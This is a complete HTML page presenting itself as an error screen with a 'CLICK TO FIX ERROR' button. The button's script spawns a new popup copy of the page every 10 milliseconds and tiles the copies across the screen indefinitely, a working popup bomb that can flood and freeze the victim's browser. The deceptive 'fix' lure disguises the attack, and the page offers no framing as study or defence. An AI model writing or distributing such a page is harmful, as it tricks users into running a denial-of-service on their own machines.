<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ERROR</title>
<style>
body {
    margin: 0;
    width: 100vw;
    height: 100vh;
    background: black;
    color: white;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

button {
    font-size: 24px;
    padding: 20px 40px;
    cursor: pointer;
}
</style>
</head>
<body>

<button onclick="start()">CLICK TO FIX ERROR</button>

<script>
let x = 0;
let y = 0;

const winWidth = 200;
const winHeight = 150;

function start() {
    document.body.innerHTML = "<h1>ERROR</h1>";

    const screenW = screen.width;
    const screenH = screen.height;

    setInterval(() => {
        window.open(
            window.location.href,
            "_blank",
            `width=${winWidth},height=${winHeight},left=${x},top=${y}`
        );

        x += winWidth;

        if (x + winWidth > screenW) {
            x = 0;
            y += winHeight;
        }

        if (y + winHeight > screenH) {
            x = 0;
            y = 0;
        }
    }, 10); // 0.01 second
}
</script>

</body>
</html>
